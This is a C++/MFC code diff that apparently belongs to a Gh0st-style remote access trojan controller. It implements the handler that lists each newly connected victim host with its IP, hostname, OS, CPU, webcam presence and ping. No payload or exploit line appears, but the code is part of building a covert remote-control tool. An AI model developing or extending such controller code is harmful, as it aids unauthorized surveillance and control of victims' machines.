@@ -12,6 +12,7 @@
 #include "CSettingDlg.h"
 #include "macros.h"
 #include "Others/macros.h"
+#include "Others/login.h"
 
 //using namespace std;
 
@@ -142,9 +143,9 @@ void CUIDlg::InitOnlineListCtrl()
 
 
 	// test
-	std::initializer_list<LPCTSTR> context = { "127.0.0.1", "本地1", "lenovo", 
-											   "win10", "xen", "yes", "100M" };
-	AddContextListCtrol(m_lcOnline, context);
+	//std::initializer_list<LPCTSTR> context = { "127.0.0.1", "本地1", "lenovo", 
+	//										   "win10", "xen", "yes", "100M" };
+	//AddContextListCtrol(m_lcOnline, context);
 }
 
 
@@ -612,11 +613,105 @@ void CUIDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)
 }
 
 
-// 上线通知
+// 上线后将主机信息显示在上线列表
 LRESULT CUIDlg::OnAddOnline(WPARAM wParam, LPARAM lParam)
 {
-	AfxMessageBox("有连接");
-	return LRESULT();
+	ClientContext *pContext = (ClientContext *)lParam;
+	if (!pContext) {
+		return -1;
+	}
+
+
+	try {
+		//int nCnt = m_pListCtrl->GetItemCount();
+
+		// 不合法的数据包
+		//if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO)) {
+		//	return -1;
+		//}
+
+		// 获取登陆主机的信息
+		LOGININFO *LoginInfo = (LOGININFO *)pContext->m_DeCompressionBuffer.GetBuffer();
+
+
+		// 填充上线主机列表
+		// 0 IP
+		sockaddr_in  sockAddr;
+		memset(&sockAddr, 0, sizeof(sockAddr));
+		int nSockAddrLen = sizeof(sockAddr);
+		BOOL bResult = getpeername(pContext->m_Socket, (SOCKADDR *)&sockAddr, &nSockAddrLen);
+		CString IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
+		// 1 区域
+		// 2 计算机名
+		CString strPCName = LoginInfo->HostName;
+		// 3 操作系统
+		char *pszOS = NULL;
+		switch (LoginInfo->OsVerInfoEx.dwPlatformId) {
+		case VER_PLATFORM_WIN32_NT:
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4) {
+				pszOS = "NT";
+			}
+
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0) {
+				pszOS = "2000";
+			}
+
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1) {
+				pszOS = "XP";
+			}
+
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2) {
+				pszOS = "2003";
+			}
+
+			if (LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0) {
+				pszOS = "Vista";  // Just Joking
+			}
+		}
+		CString strOS;
+		strOS.Format("%s SP%d (Build %d)", /*OsVerInfo.szCSDVersion,*/ pszOS,
+					LoginInfo->OsVerInfoEx.wServicePackMajor,
+					LoginInfo->OsVerInfoEx.dwBuildNumber);
+		// 4 CPU
+		CString strCPU;
+		strCPU.Format("%dMHz", LoginInfo->CPUClockMhz);
+		// 5 摄像头
+		CString strVideo;
+		strVideo = LoginInfo->bIsWebCam ? "有" : "--";
+		// 6 PING
+		CString strPing;
+		strPing.Format("%lld", LoginInfo->dwSpeed);
+
+
+		//CString	strToolTipsText;
+		//strToolTipsText.Format("New Connection Information:\nHost: %s\nIP  : %s\nOS  : Windows %s", LoginInfo->HostName, IPAddress, strOS);
+
+		//if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
+		//{
+
+		//	str = m_QQwry->IPtoAdd(IPAddress);
+		//	m_pListCtrl->SetItemText(i, 8, str);
+
+		//	strToolTipsText += "\nArea: ";
+		//	strToolTipsText += str;
+		//}
+		// 指定唯一标识
+		//m_pListCtrl->SetItemData(i, (DWORD)pContext);    //这里将服务端的套接字等信息加入列表中保存
+
+		//g_pFrame->ShowConnectionsNumber();
+
+		//if (!((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips)
+		//	g_pFrame->ShowToolTips(strToolTipsText);
+
+		std::initializer_list<LPCTSTR> context = { IPAddress, "本地", strPCName,
+											   strOS, strCPU, strVideo, strPing };
+		AddContextListCtrol(m_lcOnline, context);
+
+		context = {"加载DLL", "server dll is loaded success"};
+		AddContextListCtrol(m_lcEventLog, context);
+	} catch (...) {}
+
+	return 0;
 }
 
 
